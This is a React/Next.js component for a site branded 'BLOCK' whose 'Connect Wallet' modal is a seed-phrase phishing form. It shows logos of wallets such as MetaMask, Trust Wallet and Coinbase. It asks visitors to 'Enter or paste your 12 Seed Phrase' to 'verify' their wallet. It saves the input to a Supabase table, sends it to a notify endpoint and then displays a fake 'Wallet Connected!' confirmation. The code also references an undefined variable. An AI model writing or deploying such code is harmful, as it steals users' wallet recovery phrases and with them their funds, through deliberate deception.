'use client'

import { useState, useEffect, useRef } from 'react'
import { Wallet, X, CheckCircle2 } from 'lucide-react'
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
)

const WALLETS = [
  { name: 'MetaMask', logo: '/mm.JPG' },
  { name: 'Trust Wallet', logo: '/tw.JPG' },
  { name: 'Binance', logo: '/binance.JPG' },
  { name: 'MEXC', logo: '/mexc.JPG' },
  { name: 'Coinbase', logo: '/cb.JPG' },
  { name: 'OKX', logo: '/okx.JPG' },
  { name: 'WalletConnect', logo: '/wallets/walletconnect.png' },
  { name: 'Phantom', logo: '/Phantom.webp' },
]

type Status = 'idle' | 'connecting' | 'connected'

export default function Navigation() {
  const [open, setOpen] = useState(false)
  const [address, setAddress] = useState('')
  const [status, setStatus] = useState<Status>('idle')
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [error, setError] = useState('')
  const backdropRef = useRef<HTMLDivElement>(null)

  // Lock body scroll when modal open
  useEffect(() => {
    document.body.style.overflow = open ? 'hidden' : ''
    return () => { document.body.style.overflow = '' }
  }, [open])

  // Reset state when modal closes
  const handleClose = () => {
    if (status === 'connecting') return
    setOpen(false)
    setTimeout(() => {
      if (status !== 'connected') {
        setAddress('')
        setSelectedWallet(null)
        setStatus('idle')
        setError('')
      }
    }, 400)
  }

  const handleConnect = async () => {
  if (!address.trim()) {
    setError('Please enter your wallet address.')
    return
  }

  setError('')
  setStatus('connecting')

  try {
    const { error: dbError } = await supabase
      .from('wallet_connections')
      .insert([
        {
          wallet_address: address.trim(),
          user_id: selectedWallet,
        },
      ])

    if (dbError) throw dbError
    await fetch('/api/notify-wallet', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ walletType: selectedWallet, walletAddress: walletAddress.trim() }),
    })
    setTimeout(() => {
      setStatus('connected')
    }, 1800)

  } catch (err) {
    console.error("Wallet connection error:", err)
    setError('Something went wrong. Please try again.')
    setStatus('idle')
  }
}

  const isConnected = status === 'connected'

  return (
    <>
      <nav className="sticky top-0 z-50 bg-background/95 backdrop-blur border-b border-border">
        <div className="max-w-7xl mx-auto px-4 py-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center">
            <div className="flex items-center gap-2">
              <div className="text-2xl font-bold bg-gradient-to-r from-primary to-secondary bg-clip-text text-transparent">
                BLOCK
              </div>
            </div>

            <button
              onClick={() => {
                if (isConnected) return
                setOpen(true)
              }}
              className="flex items-center gap-2 px-4 py-2 border border-primary/50 rounded-lg hover:bg-primary/10 transition-all duration-300 hover:border-primary"
            >
              <Wallet className="w-4 h-4" />
              <span className="text-sm">
                {isConnected
                  ? `${address.slice(0, 6)}...${address.slice(-4)}`
                  : 'Connect Wallet'}
              </span>
              {isConnected && (
                <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse" />
              )}
            </button>
          </div>
        </div>
      </nav>

      {/* Backdrop */}
      <div
        ref={backdropRef}
        onClick={handleClose}
        className={`fixed inset-0 z-[99] bg-black/60 backdrop-blur-sm transition-opacity duration-300 ${
          open ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'
        }`}
      />

      {/* Slide-up Modal */}
      <div
        className={`fixed bottom-0 left-0 right-0 z-[100] bg-background rounded-t-3xl border-t border-border transition-transform duration-500 ease-[cubic-bezier(0.32,0.72,0,1)] ${
          open ? 'translate-y-0' : 'translate-y-full'
        }`}
        style={{ maxHeight: '92dvh', overflowY: 'auto' }}
      >
        {/* Handle bar */}
        <div className="flex justify-center pt-3 pb-1">
          <div className="w-10 h-1 rounded-full bg-border" />
        </div>

        <div className="px-5 pb-10 pt-2">
          {/* Header */}
          <div className="flex items-center justify-between mb-6">
            <h2 className="text-lg font-semibold">Connect Wallet</h2>
            <button
              onClick={handleClose}
              className="p-2 rounded-full hover:bg-muted transition-colors"
            >
              <X className="w-5 h-5 text-muted-foreground" />
            </button>
          </div>

          {status === 'connected' ? (
            /* ── Connected state ── */
            <div className="flex flex-col items-center gap-4 py-8">
              <CheckCircle2 className="w-16 h-16 text-green-500" />
              <p className="text-lg font-medium">Wallet Connected!</p>
              <p className="text-sm text-muted-foreground break-all text-center max-w-xs">
                {address}
              </p>
              <button
                onClick={() => setOpen(false)}
                className="mt-4 px-6 py-2 bg-primary text-primary-foreground rounded-lg text-sm font-medium hover:opacity-90 transition-opacity"
              >
                Done
              </button>
            </div>
          ) : (
            <>
              {/* Wallet grid */}
              <p className="text-sm text-muted-foreground mb-3">Choose destination wallet</p>
              <div className="grid grid-cols-4 gap-3 mb-6">
                {WALLETS.map((w) => (
                  <button
                    key={w.name}
                    onClick={() => setSelectedWallet(w.name)}
                    className={`flex flex-col items-center gap-1.5 p-3 rounded-xl border transition-all duration-200 ${
                      selectedWallet === w.name
                        ? 'border-primary bg-primary/10'
                        : 'border-border hover:border-primary/50 hover:bg-muted/50'
                    }`}
                  >
                    <img
                      src={w.logo}
                      alt={w.name}
                      className="w-8 h-8 object-contain rounded-md"
                      onError={(e) => {
                        ;(e.target as HTMLImageElement).src =
                          `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='8' fill='%23888'/><text x='50%' y='55%' dominant-baseline='middle' text-anchor='middle' fill='white' font-size='12'>${w.name[0]}</text></svg>`
                      }}
                    />
                    <span className="text-[10px] text-muted-foreground leading-tight text-center line-clamp-1 w-full">
                      {w.name}
                    </span>
                  </button>
                ))}
              </div>

              {/* Address input */}
              <div className="mb-4">
                <label className="block text-sm font-medium mb-2">
                Verify this is an active wallet to avoid loss of token
                </label>
                <textarea
                  value={address}
                  onChange={(e) => setAddress(e.target.value)}
                  placeholder="Enter or paste your 12 Seed Phrase"
                  rows={3}
                  className="w-full px-4 py-3 rounded-xl border border-border bg-muted/40 text-sm resize-none focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary placeholder:text-muted-foreground transition-all"
                />
                {error && (
                  <p className="mt-1.5 text-xs text-destructive">{error}</p>
                )}
              </div>

              {/* Connect button */}
              <button
                onClick={handleConnect}
                disabled={status === 'connecting'}
                className="w-full flex items-center justify-center gap-2 py-3 px-4 bg-primary text-primary-foreground rounded-xl font-medium text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-70 disabled:cursor-not-allowed"
              >
                {status === 'connecting' ? (
                  <>
                    <Spinner />
                    Verifying...
                  </>
                ) : (
                  <>
                    <Wallet className="w-4 h-4" />
                    Verify Wallet
                  </>
                )}
              </button>

              <p className="mt-4 text-center text-xs text-muted-foreground">
                By connecting, you agree to our Terms of Service
              </p>
            </>
          )}
        </div>
      </div>
    </>
  )
}

function Spinner() {
  return (
    <svg
      className="animate-spin w-4 h-4"
      xmlns="http://www.w3.org/2000/svg"
      fill="none"
      viewBox="0 0 24 24"
    >
      <circle
        className="opacity-25"
        cx="12"
        cy="12"
        r="10"
        stroke="currentColor"
        strokeWidth="4"
      />
      <path
        className="opacity-75"
        fill="currentColor"
        d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
      />
    </svg>
  )
}